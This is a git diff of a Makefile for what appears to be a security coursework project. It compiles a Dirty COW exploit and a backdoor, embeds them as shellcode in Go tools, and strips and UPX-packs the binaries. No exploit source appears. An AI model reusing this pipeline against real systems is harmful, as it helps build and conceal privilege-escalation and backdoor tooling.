@@ -1,8 +1,11 @@
 SHELL = /usr/bin/env bash
 
 BINDIR ?= bin
+
 VUSER ?= "averagejoe"
-VHOST ?= "192.168.56.101"
+
+GOBUILD ?= CGO_ENABLED=0 GOARCH=amd64 go build -ldflags="-w -s"
+UPX ?= upx -9
 
 all: mooshy moosh hhttpd backdoor
 
@@ -10,6 +13,7 @@ deps:
 	$(info Checking development deps...)
 	@command -v dep > /dev/null || go get -u -v github.com/golang/dep/cmd/dep
 	@command -v xxd > /dev/null || { printf 'Please install xxd\n'; exit 1; }
+	@command -v upx > /dev/null || { printf 'Please install upx\n'; exit 1; }
 	$(info Syncing go deps...)
 	@dep ensure -v
 
@@ -24,11 +28,16 @@ fmt:
 	@go fmt ./...
 
 $(BINDIR)/cow: dirtycow/dirtycow.c
+ifdef VHOST
 	$(info Compiling exploit on $(VHOST) as $(VUSER)...)
 	@scp $< $(VUSER)@$(VHOST):
-	@ssh $(VUSER)@$(VHOST) gcc -pthread $(shell basename $?) -o not-an-exploit
+	@ssh $(VUSER)@$(VHOST) gcc -pthread $(shell basename $<) -o not-an-exploit
 	@scp $(VUSER)@$(VHOST):not-an-exploit $@
-	@ssh $(VUSER)@$(VHOST) rm -f $(shell basename $?) not-an-exploit
+	@ssh $(VUSER)@$(VHOST) rm -f $(shell basename $<) not-an-exploit
+else
+	$(info Compiling exploit locally...)
+	@gcc -pthread $< -o $@
+endif
 
 cmd/moosh/cow.go: $(BINDIR)/cow
 	$(info Generating shellcode of $@...)
@@ -50,19 +59,23 @@ cmd/moosh/backdoor.go: $(BINDIR)/backdoor
 
 $(BINDIR)/moosh: cmd/moosh/cow.go cmd/moosh/backdoor.go cmd/moosh/moosh.go vendor
 	$(info Compiling $@...)
-	@CGO_ENABLED=0 GOARCH=amd64 go build -o $@ ./cmd/moosh
+	@$(GOBUILD) -o $@ ./cmd/moosh
+	@$(UPX) $@
 
 $(BINDIR)/mooshy: cmd/mooshy/mooshy.go vendor
 	$(info Compiling $@...)
-	@CGO_ENABLED=0 GOARCH=amd64 go build -o $@ ./cmd/mooshy
+	@$(GOBUILD) -o $@ ./cmd/mooshy
+	@$(UPX) $@
 
 $(BINDIR)/backdoor: cmd/backdoor/backdoor.go vendor
 	$(info Compiling backdoor...)
-	@CGO_ENABLED=0 GOARCH=amd64 go build -o $@ ./cmd/backdoor
+	@$(GOBUILD) -o $@ ./cmd/backdoor
+	@$(UPX) $@
 
 $(BINDIR)/hhttpd: ./target/hhttpd.c
 	$(info Compiling $@...)
 	gcc -o $@ $<
+	@$(UPX) $@
 
 report.pdf: README.md report-deps eisvogel.tex
 	@sed '1d' README.md | pandoc -o $@\
